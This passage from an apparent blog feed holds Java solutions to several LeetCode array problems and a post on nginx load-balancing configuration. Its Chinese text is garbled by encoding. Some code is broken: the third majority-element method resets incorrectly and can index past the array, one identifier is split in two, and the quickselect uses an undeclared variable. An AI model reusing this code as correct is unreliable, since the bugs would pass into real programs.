java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxSubArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;    <span class="hljs-comment">// int sum = nums[0];</span>    <span class="hljs-comment">// int[] dp = new int[nums.length];</span>    <span class="hljs-comment">// dp[0] = nums[0];</span>    <span class="hljs-comment">// for (int i = 1; i &lt; nums.length; i++) &#123;</span>    <span class="hljs-comment">//     dp[i] = Math.max(dp[i-1] + nums[i], nums[i]);</span>    <span class="hljs-comment">//     if(dp[i] &gt; sum)&#123;</span>    <span class="hljs-comment">//         sum = dp[i];</span>    <span class="hljs-comment">//     &#125;</span>    <span class="hljs-comment">// &#125;</span>    <span class="hljs-comment">// return sum;</span>    <span class="hljs-comment">// å¯ä»¥ä¸ä½¿ç”¨dpæ•°ç»„ï¼ŒèŠ‚çœç©ºé—´</span>    <span class="hljs-keyword">int</span> sum = nums[<span class="hljs-number">0</span>];    <span class="hljs-keyword">int</span> result = sum;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; nums.length; i++) &#123;        sum = Math.max(sum + nums[i], nums[i]);        <span class="hljs-keyword">if</span>(sum &gt; result)&#123;            result = sum;        &#125;    &#125;    <span class="hljs-keyword">return</span> result;&#125;</code></pre><h3 id="å¤šæ•°å…ƒç´ ï¼ˆåŠ›æ‰£169é¢˜ï¼‰"><a href="#å¤šæ•°å…ƒç´ ï¼ˆåŠ›æ‰£169é¢˜ï¼‰" class="headerlink" title="å¤šæ•°å…ƒç´ ï¼ˆåŠ›æ‰£169é¢˜ï¼‰"></a>å¤šæ•°å…ƒç´ ï¼ˆåŠ›æ‰£169é¢˜ï¼‰</h3><blockquote><p>ç»™å®šä¸€ä¸ªå¤§å°ä¸º n çš„æ•°ç»„ï¼Œæ‰¾åˆ°å…¶ä¸­çš„å¤šæ•°å…ƒç´ ã€‚å¤šæ•°å…ƒç´ æ˜¯æŒ‡åœ¨æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°å¤§äº âŒŠ n/2 âŒ‹ çš„å…ƒç´ ã€‚</p><p>ä½ å¯ä»¥å‡è®¾æ•°ç»„æ˜¯éç©ºçš„ï¼Œå¹¶ä¸”ç»™å®šçš„æ•°ç»„æ€»æ˜¯å­˜åœ¨å¤šæ•°å…ƒç´ ã€‚</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: [3,2,3]</p><p>è¾“å‡º: 3</p><p>ç¤ºä¾‹ 2:</p><p>è¾“å…¥: [2,2,1,1,1,2,2]</p><p>è¾“å‡º: 2</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰</p><p>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/majority-element">https://leetcode-cn.com/problems/majority-element</a></p></blockquote><ul><li>æ€è·¯ä¸€ï¼šä½¿ç”¨hashè¡¨ï¼Œéå†æ•°ç»„å¹¶è®¡æ•°å³å¯</li><li>æ€è·¯äºŒï¼šæ’åºï¼Œé¢˜ä¸­è¯´äº†æ€»æ˜¯å­˜åœ¨å¤šæ•°å…ƒç´ ï¼Œé‚£ä¹ˆæ’åºåçš„å¼ŸâŒŠ n/2 âŒ‹å³ä¸ºæ‰€æ±‚ç­”æ¡ˆ</li><li>æ€è·¯ä¸‰ï¼šä»ç¬¬ä¸€ä¸ªæ•°å¼€å§‹count=1ï¼Œé‡åˆ°ç›¸åŒçš„å°±åŠ 1ï¼Œé‡åˆ°ä¸åŒçš„å°±å‡1ï¼Œå‡åˆ°0å°±é‡æ–°æ¢ä¸ªæ•°å¼€å§‹è®¡æ•°ï¼Œæ€»èƒ½æ‰¾åˆ°æœ€å¤šçš„é‚£ä¸ª</li></ul><pre><code class="hljs java"><span class="hljs-comment">// æ€è·¯ä¸€</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">majorityElement</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;    HashMap&lt;Integer, Integer&gt; count = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.length; i++) &#123;        count.put(nums[i], count.getOrDefault(nums[i], <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);    &#125;    Set&lt;Map.Entry&lt;Integer, Integer&gt;&gt; entries = count.entrySet();    <span class="hljs-keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : entries) &#123;        <span class="hljs-keyword">if</span>(entry.getValue() &gt; nums.length / <span class="hljs-number">2</span>)&#123;            <span class="hljs-keyword">return</span> entry.getKey();        &#125;    &#125;    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;&#125;<span class="hljs-comment">// æ€è·¯äºŒ</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">majorityElement</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;    Arrays.sort(nums);    <span class="hljs-keyword">return</span> nums[nums.length / <span class="hljs-number">2</span>];&#125;<span class="hljs-comment">// æ€è·¯ä¸‰</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">majorityElement</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;    <span class="hljs-keyword">int</span> res = nums[<span class="hljs-number">0</span>];    <span class="hljs-keyword">int</span> count = <span class="hljs-number">1</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; nums.length; i++) &#123;        <span class="hljs-keyword">if</span>(nums[i] == res)&#123;            count ++;        &#125;<span class="hljs-keyword">else</span> &#123;            count --;            <span class="hljs-keyword">if</span>(count == <span class="hljs-number">0</span>)&#123;                res = nums[i + <span class="hljs-number">1</span>];            &#125;        &#125;    &#125;    <span class="hljs-keyword">return</span> res;&#125;</code></pre><h3 id="äºŒåˆ†æŸ¥æ‰¾ï¼ˆåŠ›æ‰£704é¢˜ï¼‰"><a href="#äºŒåˆ†æŸ¥æ‰¾ï¼ˆåŠ›æ‰£704é¢˜ï¼‰" class="headerlink" title="äºŒåˆ†æŸ¥æ‰¾ï¼ˆåŠ›æ‰£704é¢˜ï¼‰"></a>äºŒåˆ†æŸ¥æ‰¾ï¼ˆåŠ›æ‰£704é¢˜ï¼‰</h3><blockquote><p>ç»™å®šä¸€ä¸ª n ä¸ªå…ƒç´ æœ‰åºçš„ï¼ˆå‡åºï¼‰æ•´å‹æ•°ç»„ nums å’Œä¸€ä¸ªç›®æ ‡å€¼ target ï¼Œå†™ä¸€ä¸ªå‡½æ•°æœç´¢ nums ä¸­çš„ targetï¼Œå¦‚æœç›®æ ‡å€¼å­˜åœ¨è¿”å›ä¸‹æ ‡ï¼Œå¦åˆ™è¿”å› -1ã€‚</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: nums = [-1,0,3,5,9,12], target = 9</p><p>è¾“å‡º: 4</p><p>è§£é‡Š: 9 å‡ºç°åœ¨ nums ä¸­å¹¶ä¸”ä¸‹æ ‡ä¸º 4</p><p>ç¤ºä¾‹ 2:</p><p>è¾“å…¥: nums = [-1,0,3,5,9,12], target = 2</p><p>è¾“å‡º: -1</p><p>è§£é‡Š: 2 ä¸å­˜åœ¨ nums ä¸­å› æ­¤è¿”å› -1</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰</p><p>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/binary-search-">https://leetcode-cn.com/problems/binary-search-</a></p></blockquote><p>æ— éœ€å¤šè¨€</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;    <span class="hljs-keyword">if</span>(nums == <span class="hljs-keyword">null</span> || nums.length == <span class="hljs-number">0</span>)&#123;        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>;    <span class="hljs-keyword">int</span> right = nums.length - <span class="hljs-number">1</span>;    <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;    <span class="hljs-keyword">while</span> (left &lt;= right)&#123;        <span class="hljs-keyword">if</span>(target &gt; nums[mid])&#123;            left = mid + <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(target &lt; nums[mid])&#123;            right = mid -<span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> mid;        &#125;        mid = left + (right - left) / <span class="hljs-number">2</span>;    &#125;    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;&#125;</code></pre><h3 id="æ•°ç»„ä¸­ç¬¬kä¸ªæœ€å¤§å…ƒç´ ï¼ˆåŠ›æ‰£215é¢˜ï¼‰"><a href="#æ•°ç»„ä¸­ç¬¬kä¸ªæœ€å¤§å…ƒç´ ï¼ˆåŠ›æ‰£215é¢˜ï¼‰" class="headerlink" title="æ•°ç»„ä¸­ç¬¬kä¸ªæœ€å¤§å…ƒç´ ï¼ˆåŠ›æ‰£215é¢˜ï¼‰"></a>æ•°ç»„ä¸­ç¬¬kä¸ªæœ€å¤§å…ƒç´ ï¼ˆåŠ›æ‰£215é¢˜ï¼‰</h3><blockquote><p>åœ¨æœªæ’åºçš„æ•°ç»„ä¸­æ‰¾åˆ°ç¬¬ k ä¸ªæœ€å¤§çš„å…ƒç´ ã€‚è¯·æ³¨æ„ï¼Œä½ éœ€è¦æ‰¾çš„æ˜¯æ•°ç»„æ’åºåçš„ç¬¬ k ä¸ªæœ€å¤§çš„å…ƒç´ ï¼Œè€Œä¸æ˜¯ç¬¬ k ä¸ªä¸åŒçš„å…ƒç´ ã€‚</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: [3,2,1,5,6,4] å’Œ k = 2</p><p>è¾“å‡º: 5</p><p>ç¤ºä¾‹ 2:</p><p>è¾“å…¥: [3,2,3,1,2,4,5,5,6] å’Œ k = 4</p><p>è¾“å‡º: 4</p><p>è¯´æ˜:å¯ä»¥å‡è®¾ k æ€»æ˜¯æœ‰æ•ˆçš„ï¼Œä¸” 1 â‰¤ k â‰¤ æ•°ç»„çš„é•¿åº¦</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰</p><p>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array">https://leetcode-cn.com/problems/kth-largest-element-in-an-array</a></p></blockquote><p>æ€è·¯ä¸€ï¼šä¼˜å…ˆé˜Ÿåˆ—ï¼Œç»´æŠ¤ä¸€ä¸ªå®¹é‡ä¸ºkçš„ä¼˜å…ˆé˜Ÿåˆ—ï¼ˆæœ€å°å †ï¼‰ï¼Œå…¶é˜Ÿé¦–å…ƒç´ ä¸ºæœ€å°å€¼ï¼Œå½“éå†å®Œæ•´ä¸ªæ•°ç»„åï¼Œé˜Ÿé¦–å…ƒç´ å³ä¸ºç¬¬kå¤§çš„æ•°</p><p>æ€è·¯äºŒï¼šåŸºäºå¿«é€Ÿæ’åºçš„å¿«é€Ÿé€‰æ‹©ç®—æ³•</p><pre><code class="hljs java"><span class="hljs-comment">// ä¼˜å…ˆé˜Ÿåˆ—    </span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findKthLargest</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;    <span class="hljs-comment">// ç¬¬ 1 å¤§çš„æ•°ï¼Œä¸‹æ ‡æ˜¯ len - 1;</span>    <span class="hljs-comment">// ç¬¬ 2 å¤§çš„æ•°ï¼Œä¸‹æ ‡æ˜¯ len - 2;</span>    <span class="hljs-comment">// ...</span>    <span class="hljs-comment">// ç¬¬ k å¤§çš„æ•°ï¼Œä¸‹æ ‡æ˜¯ len - k;</span>    <span class="hljs-comment">// åˆ›å»ºä¼˜å…ˆé˜Ÿåˆ—</span>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå®¹é‡ä¸ºkçš„å°æ ¹å †ï¼Œé‚£ä¹ˆéå†æ•´ä¸ªæ•°ç»„çš„è¿‡ç¨‹ä¸­ç»´æŠ¤è¿™ä¸ªå°æ ¹å †ï¼Œé‚£ä¹ˆå…¶æ ¹å…ƒç´ å°±æ˜¯æ•°ç»„ä¸­ç¬¬kå¤§çš„æ•°</span>    PriorityQueue&lt;Integer&gt; priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue&lt;&gt;(k, Comparator.comparingInt(a -&gt; a));    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++) &#123;        priorityQueue.offer(nums[i]);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = k; i &lt; nums.length; i++) &#123;        Integer peek = priori            tyQueue.peek();        <span class="hljs-keyword">if</span>(nums[i] &gt; peek)&#123;            priorityQueue.poll();            priorityQueue.offer(nums[i]);        &#125;    &#125;    <span class="hljs-keyword">return</span> priorityQueue.peek();&#125;<span class="hljs-comment">// å¿«é€Ÿé€‰æ‹©</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findKthLargest</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;    <span class="hljs-comment">// ç¬¬ 1 å¤§çš„æ•°ï¼Œä¸‹æ ‡æ˜¯ len - 1;</span>    <span class="hljs-comment">// ç¬¬ 2 å¤§çš„æ•°ï¼Œä¸‹æ ‡æ˜¯ len - 2;</span>    <span class="hljs-comment">// ...</span>    <span class="hljs-comment">// ç¬¬ k å¤§çš„æ•°ï¼Œä¸‹æ ‡æ˜¯ len - k;</span>    <span class="hljs-keyword">int</span> len = nums.length;    <span class="hljs-keyword">int</span> target = len - k;    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>;    <span class="hljs-keyword">int</span> right = len - <span class="hljs-number">1</span>;    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;        <span class="hljs-keyword">int</span> pivotIndex = partition(nums, left, right);        <span class="hljs-keyword">if</span> (pivotIndex == target) &#123;            <span class="hljs-keyword">return</span> nums[pivotIndex];        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pivotIndex &lt; target) &#123;            left = pivotIndex + <span class="hljs-number">1</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-comment">// pivotIndex &gt; target</span>            right = pivotIndex - <span class="hljs-number">1</span>;        &#125;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">partition</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right)</span> </span>&#123;    <span class="hljs-keyword">int</span> randomIndex = left + random.nextInt(right - left + <span class="hljs-number">1</span>);    swap(nums, left, randomIndex);    <span class="hljs-comment">// all in nums[left + 1..le) &lt;= pivot;</span>    <span class="hljs-comment">// all in nums(ge..right] &gt;= pivot;</span>    <span class="hljs-keyword">int</span> pivot = nums[left];    <span class="hljs-keyword">int</span> le = left + <span class="hljs-number">1</span>;    <span class="hljs-keyword">int</span> ge = right;    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;        <span class="hljs-keyword">while</span> (le &lt;= ge &amp;&amp; nums[le] &lt; pivot) &#123;            le++;        &#125;        <span class="hljs-keyword">while</span> (le &lt;= ge &amp;&amp; nums[ge] &gt; pivot) &#123;            ge--;        &#125;        <span class="hljs-keyword">if</span> (le &gt;= ge) &#123;            <span class="hljs-keyword">break</span>;        &#125;        swap(nums, le, ge);        le++;        ge--;    &#125;    swap(nums, left, ge);    <span class="hljs-keyword">return</span> ge;&#125;<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> index1, <span class="hljs-keyword">int</span> index2)</span> </span>&#123;    <span class="hljs-keyword">int</span> temp = nums[index1];    nums[index1] = nums[index2];    nums[index2] = temp;&#125;</code></pre><h3 id="æœç´¢äºŒç»´çŸ©é˜µï¼ˆåŠ›æ‰£240é¢˜ï¼‰"><a href="#æœç´¢äºŒç»´çŸ©é˜µï¼ˆåŠ›æ‰£240é¢˜ï¼‰" class="headerlink" title="æœç´¢äºŒç»´çŸ©é˜µï¼ˆåŠ›æ‰£240é¢˜ï¼‰"></a>æœç´¢äºŒç»´çŸ©é˜µï¼ˆåŠ›æ‰£240é¢˜ï¼‰</h3><blockquote><p>ç¼–å†™ä¸€ä¸ªé«˜æ•ˆçš„ç®—æ³•æ¥æœç´¢ m x n çŸ©é˜µ matrix ä¸­çš„ä¸€ä¸ªç›®æ ‡å€¼ targetã€‚è¯¥çŸ©é˜µå…·æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š</p><p>æ¯è¡Œçš„å…ƒç´ ä»å·¦åˆ°å³å‡åºæ’åˆ—ã€‚</p><p>æ¯åˆ—çš„å…ƒç´ ä»ä¸Šåˆ°ä¸‹å‡åºæ’åˆ—ã€‚</p><p>ç¤ºä¾‹:</p><p>ç°æœ‰çŸ©é˜µ matrix å¦‚ä¸‹ï¼š</p><p>*[*</p><p> <em>[1,  4, 7, 11, 15],</em></p><p> <em>[2,  5, 8, 12, 19],</em></p><p> <em>[3,  6, 9, 16, 22],</em></p><p> <em>[10, 13, 14, 17, 24],</em></p><p> <em>[18, 21, 23, 26, 30]</em></p><p><em>]</em></p><p>ç»™å®š target = 5ï¼Œè¿”å› trueã€‚</p><p>ç»™å®š target = 20ï¼Œè¿”å› falseã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰</p><p>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/search-a-2d-matrix-ii">https://leetcode-cn.com/problems/search-a-2d-matrix-ii</a></p></blockquote><p>æ€è·¯ä¸€ï¼šé¢˜ä¸­è¯´çš„å¾ˆæ¸…æ¥šæ˜¯æœ‰åºçš„çŸ©é˜µï¼Œå¯ä»¥æ¨¡ä»¿äºŒåˆ†æœç´¢è§£å†³è¯¥é¢˜</p><p>æ€è·¯äºŒï¼š<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220924161450669.png" alt="image-20220924161450669"></p><pre><code class="hljs java"><span class="hljs-comment">// æ€è·¯ä¸€</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">searchMatrix</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] matrix, <span class="hljs-keyword">int</span> target)</span> </span>&#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span>[] nums : matrix) &#123;        <span class="hljs-keyword">if</span>(search(nums, target))&#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;    <span class="hljs-keyword">if</span>(nums == <span class="hljs-keyword">null</span> || nums.length == <span class="hljs-number">0</span>)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;    &#125;    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>;    <span class="hljs-keyword">int</span> right = nums.length - <span class="hljs-number">1</span>;    <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;    <span class="hljs-keyword">while</span> (left &lt;= right)&#123;        <span class="hljs-keyword">if</span>(target &gt; nums[mid])&#123;            left = mid + <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(target &lt; nums[mid])&#123;            right = mid -<span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        &#125;        mid = left + (right - left) / <span class="hljs-number">2</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;&#125;<span class="hljs-comment">// æ€è·¯äºŒ</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">searchMatrix</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] matrix, <span class="hljs-keyword">int</span> target)</span> </span>&#123;    <span class="hljs-comment">// ä»çŸ©é˜µçš„å³ä¸Šè§’æœç´¢ (0, matrix[0].length)</span>    <span class="hljs-keyword">int</span> m = matrix[<span class="hljs-number">0</span>].length;    <span class="hljs-keyword">int</span> n = matrix.length;    <span class="hljs-keyword">int</span> x = <span class="hljs-number">0</span>;    <span class="hljs-keyword">int</span> y = m - <span class="hljs-number">1</span>;    <span class="hljs-keyword">while</span> (x &lt; n &amp;&amp; y &gt;= <span class="hljs-number">0</span>)&#123;        <span class="hljs-keyword">if</span>(target == matrix[x][y])&#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (target &lt; matrix[x][y]) &#123;            y --;        &#125;<span class="hljs-keyword">else</span> &#123;            x ++;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;&#125;</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>java,algorithm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nginx</title>
    <link href="/2022/07/24/nginx/"/>
    <url>/2022/07/24/nginx/</url>
    
    <content type="html"><![CDATA[<h1 id="Nginxè´Ÿè½½å‡è¡¡é…ç½®"><a href="#Nginxè´Ÿè½½å‡è¡¡é…ç½®" class="headerlink" title="Nginxè´Ÿè½½å‡è¡¡é…ç½®"></a>Nginxè´Ÿè½½å‡è¡¡é…ç½®</h1><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220724181955601.png" alt="image-20220724181955601"></p><h2 id="å°†javaé¡¹ç›®æ‰“åŒ…å¹¶å¯åŠ¨"><a href="#å°†javaé¡¹ç›®æ‰“åŒ…å¹¶å¯åŠ¨" class="headerlink" title="å°†javaé¡¹ç›®æ‰“åŒ…å¹¶å¯åŠ¨"></a>å°†javaé¡¹ç›®æ‰“åŒ…å¹¶å¯åŠ¨</h2><p>è¿™é‡Œä¸ºäº†æœ‰æ•ˆæœï¼Œæ‰“åŒ…äº†ä¸¤ä»½ï¼Œå½“è®¿é—®æ¥å£æ—¶ï¼Œæ§åˆ¶å°æ‰“å°ä¸åŒçš„æ—¥å¿—</p><pre><code class="hljs sh">java -jar .\api-2.0.1-8081.jar --server.port=8081java -jar .\api-2.0.1-8082.jar --server.port=8082</code></pre><h2 id="é…ç½®nginx"><a href="#é…ç½®nginx" class="headerlink" title="é…ç½®nginx"></a>é…ç½®nginx</h2><pre><code class="hljs awk"><span class="hljs-comment">#user  nobody;</span>worker_processes <span class="hljs-number">4</span>;<span class="hljs-comment">#pid        logs/nginx.pid;</span>events &#123;     worker_connections <span class="hljs-number">40960</span>;&#125;http &#123;    include       mime.types;    default_type  application/octet-stream;    <span class="hljs-comment">#access_log  logs/access.log  main;</span>     sendfile  on;    <span class="hljs-comment">#tcp_nopush     on;</span>    <span class="hljs-comment">#keepalive_timeout  0;</span>     keepalive_timeout <span class="hljs-number">65</span>;    <span class="hljs-comment">#gzip  on;</span>    upstream myservice &#123;        server <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>;    server <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8083</span>;    <span class="hljs-comment"># server 127.0.0.1:8847;</span>    &#125;    server &#123;    listen       <span class="hljs-number">80</span>;    server_name  localhost;    location / &#123;        proxy_pass http:<span class="hljs-regexp">//my</span>service;        &#125;    &#125;<span class="hljs-comment">#include vhosts.conf;</span>    map <span class="hljs-variable">$time_iso8601</span> <span class="hljs-variable">$logdate</span> &#123;        <span class="hljs-string">&#x27;~^(?&lt;ymd&gt;\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;)&#x27;</span> <span class="hljs-variable">$ymd</span>;        default                       <span class="hljs-string">&#x27;date-not-found&#x27;</span>;    &#125;include vhosts/*.conf; client_max_body_size  <span class="hljs-number">50</span>m;     client_body_buffer_size <span class="hljs-number">60</span>k;     client_body_timeout <span class="hljs-number">60</span>;     client_header_buffer_size <span class="hljs-number">64</span>k;     client_header_timeout <span class="hljs-number">60</span>;     error_page <span class="hljs-number">400</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">400</span>.html;     error_page <span class="hljs-number">403</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">403</span>.html;     error_page <span class="hljs-number">404</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">404</span>.html;     error_page <span class="hljs-number">500</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">500</span>.html;     error_page <span class="hljs-number">501</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">501</span>.html;     error_page <span class="hljs-number">502</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">502</span>.html;     error_page <span class="hljs-number">503</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">503</span>.html;     error_page <span class="hljs-number">504</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">504</span>.html;     error_page <span class="hljs-number">505</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">505</span>.html;     error_page <span class="hljs-number">506</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">506</span>.html;     error_page <span class="hljs-number">507</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">507</span>.html;     error_page <span class="hljs-number">509</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">509</span>.html;     error_page <span class="hljs-number">510</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">510</span>.html;          keepalive_requests <span class="hljs-number">100</span>;     large_client_header_buffers <span class="hljs-number">4</span> <span class="hljs-number">64</span>k;     reset_timedout_connection on;     send_timeout <span class="hljs-number">60</span>;     sendfile_max_chunk <span class="hljs-number">512</span>k;     server_names_hash_bucket_size <span class="hljs-number">256</span>;&#125;     worker_rlimit_nofile <span class="hljs-number">100000</span>;</code></pre><p>ä¸»è¦é…ç½®å†…å®¹ä¸º</p><pre><code class="hljs nginx"><span class="hljs-attribute">upstream</span> myservice &#123;    <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:8081</span>; <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:8083</span>; <span class="hljs-comment"># server 127.0.0.1:8847;</span>&#125;<span class="hljs-section">server</span> &#123;<span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>;<span class="hljs-attribute">server_name</span>  localhost;<span class="hljs-attribute">location</span> / &#123;    <span class="hljs-attribute">proxy_pass</span> http://myservice;    &#125;&#125;</code></pre><p>å¯åŠ¨nginxå³å¯</p><p>**å½“å¯åŠ¨nginæ²¡ååº”æ—¶ï¼Œå¤šåŠæ˜¯é…ç½®æ–‡ä»¶æœ‰é—®é¢˜ï¼Œå¯ä»¥ç›´æ¥æ‹·è´æ­£ç¡®çš„é…ç½®åä¿®æ”¹</p><h1 id="Nginxè´Ÿè½½å‡è¡¡ç­–ç•¥"><a href="#Nginxè´Ÿè½½å‡è¡¡ç­–ç•¥" class="headerlink" title="Nginxè´Ÿè½½å‡è¡¡ç­–ç•¥"></a>Nginxè´Ÿè½½å‡è¡¡ç­–ç•¥</h1><blockquote><p>å‰ç«¯/ç”¨æˆ·æ‰€æœ‰å¯¹Tomcat(åº”ç”¨æœåŠ¡å™¨)çš„è¯·æ±‚éƒ½æ˜¯é€šè¿‡Nginxè½¬å‘çš„:<br>ç”¨æˆ·è¯·æ±‚å‘é€åˆ°nginxï¼Œnginxè½¬å‘çš„å¯¹åº”çš„æœåŠ¡å™¨ï¼Œä¸€ä¸ªé›†ç¾¤ä¸­æœ‰å¤šä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ï¼Œé‚£ä¹ˆNginxæ€ä¹ˆç¡®å®šè½¬å‘åˆ°å“ªä¸ªæœåŠ¡å™¨èŠ‚ç‚¹å‘¢?<br>Nginxæä¾›äº†å››ç§è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒé…ç½®ç¬¬ä¸‰æ–¹çš„è´Ÿè½½å‡è¡¡ç­–ç•¥ã€‚</p></blockquote><h2 id="è½®è¯¢"><a href="#è½®è¯¢" class="headerlink" title="è½®è¯¢"></a>è½®è¯¢</h2><blockquote><p>æ ¹æ®ç”¨æˆ·çš„è¯·æ±‚äº¤æ›¿çš„å‘é€åˆ°æ¯ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ï¼Œæ˜¯nginxé»˜è®¤çš„è´Ÿè½½å‡è¡¡ç­–ç•¥</p></blockquote><pre><code class="hljs properties"><span class="hljs-attr">upstream</span> <span class="hljs-string">myservice &#123;</span>    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8081 max_fails=3 